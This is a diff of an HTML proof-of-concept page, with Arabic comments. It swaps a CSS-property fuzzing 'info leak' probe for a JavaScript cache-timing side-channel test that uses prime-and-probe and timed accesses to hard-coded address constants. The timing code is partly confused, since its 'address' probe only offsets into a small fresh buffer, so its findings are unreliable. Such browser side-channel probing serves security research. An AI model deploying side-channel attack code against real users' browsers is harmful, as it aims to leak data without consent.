@@ -1,75 +1,89 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h2>PoC 4: CSS-based Info Leak</h2>
-<button onclick="runCSSLeak()">جرب تسريبات CSS</button>
-<div id="target" style="width: 100px; height: 100px;"></div>
-<div id="cssLog" style="font-family: monospace; white-space: pre;"></div>
+<h2>PoC 5: Cache Timing Side-Channel</h2>
+<button onclick="runTimingAttack()">ابدأ هجوم التوقيت</button>
+<div id="timing" style="font-family: monospace; white-space: pre;"></div>
 
 <script>
 function log(msg) {
-    document.getElementById('cssLog').textContent += msg + '\n';
+    document.getElementById('timing').textContent += msg + '\n';
 }
 
-function runCSSLeak() {
-    log('=== CSS Leak Hunter ===\n');
+function runTimingAttack() {
+    log('=== Cache Timing Attack ===\n');
     
-    const target = document.getElementById('target');
+    // Cache eviction: تفريغ الكاش
+    function evictCache() {
+        const arr = new Uint8Array(1024 * 1024 * 10); // 10MB
+        for (let i = 0; i < arr.length; i += 4096) {
+            arr[i] = i;
+        }
+        return arr;
+    }
     
-    // قائمة بكل الـ CSS properties غير الموثقة أو الخطيرة
-    const dangerousProps = [
-        '-webkit-clip-path',
-        '-webkit-mask-image',
-        '-webkit-shape-outside',
-        '-webkit-text-fill-color',
-        'will-change',
-        'transform',
-        'backdrop-filter',
-        '-webkit-box-reflect',
-        'offset-path',
-        'clip-path',
-        'filter',
-        '-webkit-filter',
+    // قياس دقيق للوقت
+    function measure(fn) {
+        const start = performance.now();
+        fn();
+        return performance.now() - start;
+    }
+    
+    // محاولة الوصول إلى عناوين مختلفة
+    const testAddrs = [
+        0x100000000n, 0x200000000n, 0x300000000n,
+        0x7ff000000000n, 0x7ff100000000n
     ];
     
-    // تجربة كل خاصية مع قيم غريبة
-    dangerousProps.forEach(prop => {
-        const testValues = [
-            'url(#invalid)',
-            'linear-gradient(0deg, red 0x41414141, blue)',
-            'var(--undefined)',
-            'calc(100% + 0x1234)',
-            'initial',
-            'inherit',
-            'unset',
-            'revert',
-            'revert-layer',
-        ];
+    log('Testing access times to various addresses...\n');
+    
+    testAddrs.forEach(addr => {
+        evictCache();
         
-        testValues.forEach(val => {
+        const time = measure(() => {
+            // محاولة إنشاء view على عنوان
             try {
-                target.style[prop] = val;
-                const computed = window.getComputedStyle(target)[prop];
-                if (computed && computed !== val && computed !== '') {
-                    log(`${prop}: ${val} → ${computed}`);
-                    
-                    // فحص hex في الناتج
-                    const hexMatches = computed.match(/0x[0-9a-f]+/i);
-                    if (hexMatches) {
-                        log(`🔥 HEX LEAK in ${prop}: ${hexMatches[0]}`);
-                    }
-                }
+                // هذا لن يعمل مباشرة، لكن نقيس وقت المحاولة
+                const buf = new ArrayBuffer(1024);
+                const view = new Uint8Array(buf, Number(addr & 0xFFFFn), 64);
             } catch(e) {}
         });
+        
+        log(`Address 0x${addr.toString(16)}: ${time.toFixed(3)}ms`);
     });
     
-    // محاولة مع CSS variables
-    log('\n=== CSS Variables Test ===');
-    target.style.setProperty('--test', '0x41414141');
-    const val = getComputedStyle(target).getPropertyValue('--test');
-    log(`CSS Variable: ${val}`);
+    // Prime & Probe attack
+    log('\n=== Prime & Probe ===\n');
     
-    log('\n=== انتهى PoC 4 ===');
+    const probeArray = new Uint8Array(4096);
+    
+    // Prime: ملء الكاش
+    for (let i = 0; i < probeArray.length; i++) {
+        probeArray[i] = i;
+    }
+    
+    // Probe: قياس أوقات الوصول
+    const timings = [];
+    for (let i = 0; i < 256; i++) {
+        evictCache();
+        const time = measure(() => probeArray[i * 16]);
+        timings.push(time);
+    }
+    
+    // عرض النتائج
+    const minTime = Math.min(...timings);
+    const maxTime = Math.max(...timings);
+    
+    log(`Min time: ${minTime.toFixed(3)}ms`);
+    log(`Max time: ${maxTime.toFixed(3)}ms`);
+    log(`Variance: ${(maxTime - minTime).toFixed(3)}ms`);
+    
+    if (maxTime - minTime > 0.1) {
+        log('⚠️ Significant timing variance detected!');
+        log('This suggests cache effects are observable.');
+    }
+    
+    log('\n=== انتهى PoC 5 ===');
 }
 </script>
 </body>
